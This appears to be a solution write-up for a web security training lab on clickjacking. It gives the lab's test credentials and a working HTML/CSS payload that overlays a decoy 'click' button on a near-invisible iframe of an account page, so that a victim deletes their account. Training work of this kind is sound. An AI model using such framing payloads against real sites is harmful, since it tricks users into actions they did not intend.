
# Basic clickjacking with CSRF token protection

This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.

To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.

You can log in to your own account using the following credentials: wiener:peter

Note: The victim will be using Chrome so test your exploit on that browser.

---------------------------------------------

References: 

- https://portswigger.net/web-security/clickjacking



![img](images/Basic%20clickjacking%20with%20CSRF%20token%20protection/1.png)

---------------------------------------------

The problem is to set the correct CSS valus so the button is clicked, in this case these values worked:

```
<head>
	<style>
		#target_website {
			position:relative;
			width:600px;
			height:600px;
			opacity:0.1;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:600px;
			height:600px;
			z-index:1;
			}
		#btn {
			position:absolute;
			top:480px;
			left:90px;
		}
	</style>
</head>
<body>
	<div id="decoy_website">
	<button id="btn">click</button>
	</div>
	<iframe id="target_website" src="https://0a19006b043fc0ca803c0dd100220095.web-security-academy.net/my-account">
	</iframe>
</body>
```



![img](images/Basic%20clickjacking%20with%20CSRF%20token%20protection/2.png)